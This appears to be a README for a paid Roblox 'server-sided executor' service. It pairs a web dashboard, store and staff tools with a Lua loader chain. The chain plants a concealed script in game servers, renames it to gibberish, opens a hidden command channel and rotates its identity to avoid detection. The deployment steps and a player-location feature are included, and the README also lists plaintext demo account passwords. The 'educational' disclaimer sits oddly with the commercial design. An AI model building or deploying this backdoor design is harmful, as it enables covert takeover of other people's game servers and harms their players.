# CDN_SS — Server-Sided Executor by CDNWARE

A production-ready Roblox **server-sided executor** platform: React (TSX) frontend with a
black/red theme and clean animations, a hardened Node.js/Next.js API, three staff dashboards,
and the Roblox Lua payload chain (Loader → MainModule → Server Execution Script).

---

## 1. Stack

| Layer | Technology |
| --- | --- |
| Frontend | Next.js (App Router) + React 19 + TypeScript + Tailwind CSS 4 + Framer Motion + lucide-react |
| Backend | Next.js route handlers (Node.js runtime) |
| Database (app) | PostgreSQL via Drizzle ORM (`src/db/schema.ts`) |
| Database (reference SQL) | MySQL 8 DDL + seed: [`database/cdn_ss_mysql.sql`](database/cdn_ss_mysql.sql) |
| Payloads | [`roblox/Loader.server.lua`](roblox/Loader.server.lua), [`roblox/MainModule/init.lua`](roblox/MainModule/init.lua), [`roblox/ServerExecution.lua`](roblox/ServerExecution.lua) |

---

## 2. Quick start

```bash
npm install
npx drizzle-kit push        # create the PostgreSQL schema
npm run build && npm start  # production
# or: npm run dev
```

`DATABASE_URL` is read from `.env`. Reference data (settings, games, announcements, demo
accounts, forum threads, script filters) is seeded automatically and idempotently on first
request — see `src/lib/bootstrap.ts`.

### Demo accounts

| Role | Email | Password |
| --- | --- | --- |
| Owner | `owner@cdnware.dev` | `Owner#2026` |
| Admin | `admin@cdnware.dev` | `Admin#2026` |
| Moderator | `mod@cdnware.dev` | `Mod#2026` |
| Premium member | `premium@cdnware.dev` | `Premium#2026` |
| Standard member | `standard@cdnware.dev` | `Standard#2026` |
| Free member | `member@cdnware.dev` | `Member#2026` |

---

## 3. User flow

1. **Guest landing page** (`/`) — welcome copy, live site statistics, Sign up / Log in.
2. **Signup → onboarding** — every new account is forced through
   `/onboarding/tos` and then `/onboarding/rules` before the dashboard unlocks
   (server-enforced by `requireCompleteUser()`).
3. **Home dashboard** (`/dashboard`) — *Welcome back, [USERNAME]*, account status
   (Member / Customer / Premium), scripts executed, strikes, account age, badges, recent activity.
4. **Announcements** — global posts from admins; unread posts show a red pulsing dot in the
   navbar and on the cards.
5. **Store** — Standard / Premium cards; purchase links and prices are set by the Owner.
6. **Games** — tier-filtered game list (no tier labels shown to users), live-refreshing server
   list per game, **player search** that returns the exact server a player is in, and the
   executor:
   * Lua editor (monospace, focus glow)
   * Save / Load / Delete named scripts
   * **Execute** (Run icon) and **Clear** (Restart icon)
   * Animated **Executed** success indicator + console output
   * Blocked scripts surface a red indicator and an explanation
7. **Forum** — Scripts, Support, Suggestions, Just Talk. Custom safe markup renderer with
   **bold**, *italic*, underline, strike, `inline code`, fenced code blocks, autolinks and
   image uploads (2 MB, magic-byte validated, served from `/api/images/:id`).
8. **Rules** — owner-editable; a "updated — re-read required" indicator appears for everyone
   when the version bumps.
9. **Settings** — username, password (re-auth required, all sessions invalidated), avatar, bio.

---

## 4. Staff dashboards (`/staff`)

### Moderator
* User lookup by username/email + suspend + strike + staff notes.
* **Cannot** see IP addresses, **cannot** blacklist, **cannot** change Standard/Premium access.
* Script logs: open a log, read the full payload, run a **sandbox test**, then **freeze**
  (permanent suspension until an admin reviews) or **escalate** the case.

### Admin (assigned by the Owner)
* Everything moderators can do **plus** IP addresses, previous suspensions, staff notes,
  grant/revoke Standard & Premium, suspend with reason + timeframe, blacklist with reason
  (the blacklisting admin and reason are visible to all admins).
* Review queue: flagged scripts, direct suspend / blacklist / freeze / clear.
* Script filters: blacklist payloads by `contains` / `exact` / `regex`; a matching execution
  auto-suspends or auto-blacklists the account instantly.
* Audit logs of every admin & moderator action.

### Owner
* User management incl. promoting to Admin / Moderator and granting **private** games.
* Game review: approve or reject unapproved games as Standard, Premium or Private.
* Site settings: Rules, Terms of Service (both versioned), store links + prices.
* Everything admins can do.

---

## 5. Security hardening

* **Passwords** — scrypt (`N=16384, r=8, p=1`, 16-byte random salt, 64-byte key) with
  constant-time verification. Never stored or logged in plaintext.
* **Sessions** — 256-bit random tokens; only the SHA-256 hash is stored. `httpOnly`,
  `sameSite=lax`, `secure` in production, 7-day expiry, invalidated on password change and on
  any suspension / freeze / blacklist.
* **Authorisation** — a single permission matrix (`src/lib/permissions.ts`) is enforced in
  every route handler; the owner account can never be moderated, moderators cannot act on
  admins.
* **Input validation** — every request body is parsed with Zod schemas (`src/lib/validation.ts`).
* **Rate limiting** — per-IP fixed windows on auth, execution, upload, forum and staff routes.
* **CSRF** — cookie is `sameSite=lax` and every unsafe method validates the `Origin` header.
* **XSS** — user content is never rendered as HTML; the markup renderer produces React nodes
  only, and image URLs are restricted to `https://` or internal image ids.
* **Uploads** — MIME allow-list, 2 MB cap, magic-byte sniffing (PNG/JPEG/GIF/WEBP), served with
  `Content-Security-Policy: default-src 'none'` and `nosniff`.
* **Injection** — all queries are parameterised through Drizzle ORM; no string-built SQL.
* **Headers** — CSP, HSTS, `X-Frame-Options: DENY`, `nosniff`, referrer policy and a locked
  permissions policy (`next.config.ts`).
* **Regex filters** — staff regex patterns are compiled in a try/catch and length-capped so a
  broken pattern can never break execution.
* **Audit trail** — every staff action writes to `audit_logs` with actor, target, reason and IP.

---

## 6. Roblox Lua payloads

| File | Purpose |
| --- | --- |
| `roblox/Loader.server.lua` | Tiny silent loader that `require`s the MainModule and boots it through the `ehhsdiweew` index. |
| `roblox/MainModule/init.lua` | Requireable module. Spawns a child script, renames it to random gibberish, moves it into `ServerScriptService`, and is only usable via `require(id).ehhsdiweew`. |
| `roblox/ServerExecution.lua` | The injected server script: sandboxed payload environment, hidden command channel, jittered drain loop and identity churn. |

Deployment: publish `MainModule` as a model asset, paste the asset id into
`MAIN_MODULE_ID` in the loader, then run the loader from any server-side context.

---

## 7. Project layout

```
src/app                     # pages (landing, auth, onboarding, dashboard, staff)
src/app/api                 # REST route handlers
src/components              # TSX client components + UI primitives
src/lib                     # auth, security, permissions, validation, servers, markup
src/db                      # Drizzle schema + client
roblox/                     # Lua payloads
database/cdn_ss_mysql.sql   # MySQL 8 schema + seed
scripts/hash-password.js    # scrypt hash generator for the SQL seed
public/CDN_SS_By_CDNWARE.zip# full project archive
```

---

## 8. API surface

```
GET    /api/health
POST   /api/auth/signup            POST /api/auth/login        POST /api/auth/logout
POST   /api/onboarding
GET    /api/me                     GET  /api/games
GET    /api/games/:id/servers      POST /api/games/:id/servers (attach)
POST   /api/execute                GET  /api/execute (history)
GET    /api/scripts                POST /api/scripts
PUT    /api/scripts/:id            DELETE /api/scripts/:id
GET    /api/forum/threads          POST /api/forum/threads
GET    /api/forum/threads/:id      POST /api/forum/threads/:id   PATCH /api/forum/threads/:id
GET    /api/announcements          POST /api/announcements       PATCH /api/announcements
POST   /api/images                 GET  /api/images/:id
GET    /api/settings               PATCH /api/settings
GET    /api/store
GET    /api/staff/lookup           GET/POST /api/staff/user/:id
GET    /api/staff/review           POST /api/staff/review
GET/POST/DELETE /api/staff/scripts
GET    /api/staff/logs             GET/POST /api/staff/games
GET/PUT /api/owner/settings
```

---

CDN_SS is an educational project. It is not affiliated with Roblox Corporation. Use the payload
chain only in environments you are authorised to test.
